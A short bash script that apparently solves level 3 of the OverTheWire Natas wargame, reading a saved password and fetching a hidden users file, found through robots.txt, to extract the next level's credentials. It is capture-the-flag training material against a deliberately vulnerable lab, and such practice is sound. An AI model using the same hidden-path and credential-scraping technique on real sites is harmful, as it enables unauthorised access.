#!/bin/bash

natas=natas3
key=$(< keys/tres)
uri="http://$natas.natas.labs.overthewire.org/s3cr3t/users.txt"
opts=""
filter=natas4

#curl -u natas3:$(cat keys/tres) http://natas3.natas.labs.overthewire.org/robots.txt 2>/dev/null 

curl -u $natas:$key $opts $uri 2> /dev/null | grep $filter

